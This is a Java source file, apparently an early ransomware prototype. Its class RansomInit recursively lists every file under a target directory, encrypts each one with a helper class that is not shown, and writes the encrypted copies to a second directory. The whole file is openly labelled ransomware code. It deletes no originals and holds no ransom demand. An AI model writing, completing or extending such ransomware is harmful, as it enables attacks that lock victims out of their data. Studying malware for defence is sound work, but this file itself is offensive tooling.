package f0ns1;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

public class RansomInit {

	public static void main(String[] args) {
		System.out.println("ransomware Init");
		String dir = "";
		String ransomDir = "";
		String key="";
		if (args.length != 3) {
			dir = "/tmp/ransom/";
			ransomDir = "/tmp/ransomDir/";
		} else {
			dir = args[0];
			ransomDir = args[1];
			key= args[2];
		}
		System.out.println("Default directory: " + dir);
		System.out.println("Encrypted output Directory: " + ransomDir);
		EncryptAlg enc = new EncryptAlg(key);
		File folder = new File(dir);
		List<String> files = listFilesForFolder(folder);
		for (String file : files) {
			System.out.println("Path files to encrypt : " + file);
			System.out.println("Data Encrypted proces: ");
			byte[] content = enc.encrypt(file);
			copyProcess(ransomDir, getName(file), content);
			System.out.println("Verify content: " + enc.decrypt(content));

		}

	}

	private static void copyProcess(String ransomDir, String name, byte[] content) {
		File create = new File(ransomDir);
		try {
			// create directory if not exists
			if (!create.exists()) {
				create.mkdir();
			}
			// createnew file
			if (!create.exists()) {
				create = new File(ransomDir + name);
				create.createNewFile();
			}
			try (FileOutputStream fos = new FileOutputStream(ransomDir + name)) {
				// write content on file
				fos.write(content);
			} catch (IOException e) {
				e.printStackTrace();
			}
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	private static String getName(String file) {
		String[] data = file.split("/");
		return data[data.length - 1];
	}

	public static List<String> listFilesForFolder(final File folder) {
		List<String> list = new ArrayList<String>();
		for (final File fileEntry : folder.listFiles()) {
			if (fileEntry.isDirectory()) {
				list.addAll(listFilesForFolder(fileEntry));
			} else {
				list.add(fileEntry.getPath());
			}
		}
		return list;
	}

}
